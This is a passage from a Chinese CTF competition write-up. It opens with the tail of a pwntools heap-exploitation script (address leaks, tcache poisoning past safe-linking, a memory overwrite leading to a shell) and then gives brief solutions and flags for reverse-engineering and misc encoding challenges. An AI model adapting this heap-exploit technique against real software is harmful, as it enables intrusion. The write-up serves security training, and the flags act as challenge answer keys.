    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">': '</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'3'</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">': '</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">': '</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'4'</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">': '</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Content: '</span><span class="p">)</span>


<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x528</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x538</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x518</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x538</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x538</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mi">2060528</span>


<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mi">656</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mi">2060528</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mi">656</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">2057132</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x538</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x518</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x600</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x600</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="sa">b</span><span class="s1">'pay1'</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'pay2'</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2800</span><span class="p">)</span>  <span class="o">&gt;&gt;</span> <span class="mh">0xC</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00404020</span> <span class="o">^</span> <span class="n">key</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x600</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x600</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">pay</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4010a6</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011D6</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'4'</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h1 data-content="1" id="a2948f971293c8b759f6660a17b0045b">re1</h1>
<p>安卓逆向，jadx打开分析</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155448-4445ff46-7f01-1.png"/></p>
<p>将字符串进行异或、赋予cipher</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155454-4791326a-7f01-1.png"/></p>
<p>用key验证</p>
<p>hook出密文和密钥</p>
<p>fatd{sm_cgrmvc_ylvhokhuk_gxsgffc_wtec}</p>
<p>aptxcony</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155501-4b85eb72-7f01-1.png"/></p>
<p>拿到flag</p>
<h1 data-content="1" id="4aaece2a6c81bf783376435bddace2d6">re2</h1>
<p>使用pyinstxtractor.py反编译拿到.py，但是并没有发现什么有用的信息，就只找到一个像base64编码的结果，解码一下，是}RW61480i3dkfcRW61480i3dkMAJUO{nhsm，逆序一下，mshn{OUJAMkd3i08416WRcfkd3i08416WR}，感觉很像凯撒，就用在线工具解一下，当偏移量为7的时候，就是flag了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155507-4f56bf06-7f01-1.png"/></p>
<h1 data-content="1" id="4f86d8c9a712996142786deecab21adf">re3</h1>
<p>附件里有两个.hxx文件，一个是头文件，一个是源码，把头文件导入一下，然后就可以运行了，把所有比较的值输出一下，就可以用z3来解密了，</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">var</span> <span class="o">=</span> <span class="p">[</span><span class="n">Int</span><span class="p">(</span><span class="n">f</span><span class="s1">'var{i}'</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">)]</span>
<span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>

<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">([</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">101</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">143</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">var</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">5035</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mi">163</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mi">226</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">*</span> <span class="n">var</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mi">5814</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="mi">205</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="mi">173</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">*</span> <span class="n">var</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="mi">9744</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">*</span> <span class="n">var</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">==</span> <span class="mi">5375</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">*</span> <span class="n">var</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">==</span> <span class="mi">4670</span><span class="p">,</span>
    <span class="n">var</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">==</span> <span class="mi">205</span>
<span class="p">])</span>
<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">([</span><span class="n">And</span><span class="p">(</span><span class="n">v</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v</span> <span class="o">&lt;=</span> <span class="mi">127</span><span class="p">)</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">var</span><span class="p">])</span>

<span class="k">if</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
    <span class="n">model</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">model</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">())</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">var</span><span class="p">])</span>
    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></div>
<p>拿到flag的大部分：50_pr3TtY_n0，不要忘记最后还有个w</p>
<h1 data-content="1" id="101e94e5579383c8de2ff1497437fe41">re4</h1>
<p>ExeinfoPE查壳，一种没见过的保护，问gpt，它提供了一种思路是用de4dot去壳，现学现用，去壳之后，正常分析，很明显的动调拿flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155515-545cccca-7f01-1.png"/></p>
<p>动调拿到迷宫，可以在内存中查看，可以在局部变量里看到，12<em>6的迷宫，一开始半信半疑，因为根据前面的代码逻辑，迷宫应该是14 </em>6？但是正确的确实是12 *6，然后就可以根据代码中对应的上下左右，得到路径：rdrrrrrddrruuurrrdddddllllllluull</p>
<p>这是迷宫：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155523-58e8e04e-7f01-1.png"/></p>
<p>输入flag，点100次，出flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155528-5c14acbc-7f01-1.png"/></p>
<h1 data-content="1" id="dc1fd2167baafd57a7010c6130cd986f">misc1</h1>
<p>在下载的doc文件中，尝试搜索“flag”关键词，结果停在了空白区域。于是用鼠标拖动选择，果然发现了隐藏的字符。通过更改文本颜色，成功看到了flag的内容</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155535-5fd03a56-7f01-1.png"/></p>
<h1 data-content="1" id="2a16c02b9ab944fb958b7b0b8b61499f">misc2</h1>
<p>奇怪编码，第一个是brainfuck：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155541-637ef16a-7f01-1.png"/></p>
<p>第二个是jsfuck：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155546-6660d4ac-7f01-1.png"/></p>
<p>第三个是ook！解密：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155551-69b3bcc8-7f01-1.png"/></p>
<p>解出flag：</p>
<pre><code>flag{ab71cda1b495e13b3f21f6fd50221978}</code></pre>
<h1 data-content="1" id="a3166e8c18683314b819796fb98c8105">misc3</h1>
<p>打开流量文件，你会发现这是一些蓝牙相关的数据。在虚拟机内使用 <code>binwalk</code> 工具，可以识别到其中包含可提取的部分。</p>
<p>接着，使用 <code>dd</code> 命令截取我们需要的部分</p>
<p>提取完成后，你会得到一个压缩包，解压缩后可以看到两个文件。</p>
<p>flag：10004583275926070044326083910251708233320797779355779208703097816305188140191914132269450797</p>
<p>key：5216294695211820293806247029887026154798297270637676463374801674229881314620340407569315152</p>
<p>将这两个文件转换为十六进制，并进行异或操作，就可以得到结果。</p>
<p>flag{66526827ff3ba85e1444a0df4acbba93}</p>
<h1 data-content="1" id="2bd8bfe2e330661c792d21d86502f508">misc4</h1>
<p>一打开编码就知道是unicode解密：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155558-6dc67ddc-7f01-1.png"/></p>
<p>紧接着hexreverse：</p>
<p>9VDZ5AzN3YTOwgjN1QzM1RGSWVEUKtXaj5Ga</p>
<p>然后是逆序</p>
<p>aG5jaXtKUEVWSGR1MzQ1NjgwOTY3NzA5ZDV9</p>
<p>和base64：</p>
<p>hnci{JPEVHdu345680967709d5}</p>
<p>最后2偏移的凯撒：</p>
<p>flag{HNCTFbs345680967709b5}</p>
</div>
</div>